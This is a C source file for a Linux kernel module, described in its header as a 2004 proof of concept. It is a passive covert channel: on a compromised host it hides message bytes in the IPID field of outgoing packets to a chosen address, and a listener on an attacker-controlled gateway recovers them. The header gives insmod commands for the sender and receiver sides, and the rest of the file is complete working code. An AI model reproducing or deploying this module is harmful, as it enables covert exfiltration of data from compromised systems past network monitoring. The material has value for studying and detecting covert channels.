/*
 * Simple Passive Covert Channel using IPID field for sending messages.
 * This channel is passive, meaning it does not geenrate any packets
 * and only changes the packets which are genereted by other processes.
 *
 * only the packets sent to 'dest_ip' are changed
 * 
 * on the compromised host:
 * insmod cc.o mode=snd dest_ip=<some ip which pass throu your gate> message=<...>
 *
 * on the gate contolled by the attacker:
 * insmod cc.o mode=lstn dest_ip=<same as in sender> 
 * 
 * written by joanna at invisiblethings.org, 2004.
 *
 * credits to kossak and lifeline for the original phrack article
 * of how to use ptype handlers for backdoors implementation
 * 
 * just a POC, tested on RedHat9, compile with -D__OPTIMIZE__
 *
 */

#define MODULE
#define __KERNEL__

#include <linux/config.h>
#include <linux/module.h>
#include <linux/version.h>

#include <linux/byteorder/generic.h>
#include <linux/netdevice.h>
#include <net/protocol.h>
#include <net/pkt_sched.h>
#include <net/tcp.h>
#include <net/ip.h>
#include <linux/if_ether.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/skbuff.h>
#include <linux/icmp.h>

#include <linux/kernel.h>
#include <linux/mm.h>
#include <linux/file.h>
#include <asm/uaccess.h>


char *dev, *dest_ip;
char *mode;
int send_mode = 0, lstn_mode = 0;
char *message;
char rcv_message [1024];
int send_ptr = 0;
int rcv_ptr = 0;
int rcv_complete = 0;
struct net_device *d;
MODULE_PARM(dev, "s"); 
MODULE_PARM(dest_ip, "s");
MODULE_PARM(message, "s");
MODULE_PARM(mode, "s");

unsigned long int magic_ip, magic_port;

struct packet_type cc_proto;

__u32 in_aton(const char *);

int cc_func(struct sk_buff *skb, 
		struct net_device *dv,
		struct packet_type *pt) {

  unsigned char c;
  if ((skb->pkt_type == PACKET_HOST || skb->pkt_type == PACKET_OUTGOING)
	&& (skb->nh.iph->daddr == magic_ip)) {

	if (send_mode) {
		if (send_ptr > strlen(message)) goto out;			
		if (send_ptr == strlen(message)) c = 0xff;
		else c = message[send_ptr];
		skb->nh.iph->id = c;
		// recalculate checksum...
		ip_send_check (skb->nh.iph);
#if 0
		printk ("CC: transmitted byte #%d: %c\n", 
			send_ptr, message[send_ptr]);
#endif
		send_ptr++;
	}
	if (lstn_mode) {
		if (rcv_complete) goto out;
		if (rcv_ptr > sizeof (rcv_message)) goto out;
		c = skb->nh.iph->id;
		if (c == 0xff) {
			rcv_complete = 1;
#if 1
			printk ("\nCC: message received: \"%s\"\n", 
				rcv_message);
#endif
			goto out;
		}

		rcv_message[rcv_ptr] = c;  
		printk ("CC: byte #%d received: '%c'\n", 
		rcv_ptr, rcv_message[rcv_ptr]);
		rcv_ptr++;
	}

  }

  out:
  kfree_skb(skb);
  return 0;
}

/*
 *      Convert an ASCII string to binary IP.
 */

__u32 in_aton(const char *str) {
        unsigned long l;
        unsigned int val;
        int i;

        l = 0;
        for (i = 0; i < 4; i++) {
                l <<= 8;
                if (*str != '\0') {
                        val = 0;
                        while (*str != '\0' && *str != '.') {
                                val *= 10;
                                val += *str - '0';
                                str++;
                        }
                        l |= val;
                        if (*str != '\0')
                                str++;
                }
        }
        return(htonl(l));
}

int usage () {
  printk("Usage: insmod cc.o mode=[snd|lstn] <options>\n");
  printk(" dest_ip=10.11.12.13\n");
  printk(" message=alamakota\n");
  printk(" dev=eth0\n");
  return -ENXIO;
}

int init_module() {
  printk ("CC: init...\n");
  if (!dest_ip) return usage();
  magic_ip = in_aton(dest_ip);

  if (!mode) return usage();
  if (strncmp (mode, "snd", 3) == 0) send_mode = 1;
  if (strncmp (mode, "lstn", 4) == 0) lstn_mode = 1;
  if (!send_mode && !lstn_mode) return usage();

  if (!message && send_mode) return usage();

  if (dev) {
	d = dev_get_by_name(dev);
	if (!d) printk("Did not find device %s!\n", dev);
	else cc_proto.dev = d;
  } 

  cc_proto.type = htons(ETH_P_ALL); 
  cc_proto.func = cc_func;
  dev_add_pack(&cc_proto);

  printk ("CC started in %s mode\n", (send_mode) ? "send" : "listen");
  printk ("magic_ip: %#x (%s)\n", magic_ip, dest_ip);
  if (dev) printk("Using device %s, ifindex: %i\n", 
			d->name, d->ifindex);
  else printk("Using all devices...\n");

  return(0);
}

void cleanup_module() {
  dev_remove_pack(&cc_proto);
  printk("CC unloaded\n");
}

MODULE_LICENSE("GPL");
